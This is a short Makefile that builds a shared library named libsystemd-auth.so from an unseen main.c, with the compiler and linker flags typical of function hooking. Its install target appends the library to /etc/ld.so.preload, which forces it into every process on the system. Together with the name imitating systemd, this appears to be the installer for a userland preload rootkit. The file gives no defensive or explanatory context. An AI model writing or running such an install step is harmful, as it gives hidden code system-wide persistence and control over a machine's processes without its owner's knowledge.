CC = gcc
CFLAGS = -Wall -fPIC -D_GNU_SOURCE
LDFLAGS = -shared -ldl
TARGET = libsystemd-auth.so
SRC = main.c
OBJ = main.o

all: $(TARGET)

$(TARGET): $(OBJ)
	$(CC) $(CFLAGS) -o $(TARGET) $(OBJ) $(LDFLAGS)

$(OBJ): $(SRC)
	$(CC) $(CFLAGS) -c $(SRC) -o $(OBJ)

clean:
	rm -f $(OBJ) $(TARGET)

install:
	cp $(TARGET) /usr/local/lib/
	echo "/usr/local/lib/$(TARGET)" >> /etc/ld.so.preload

.PHONY: all clean install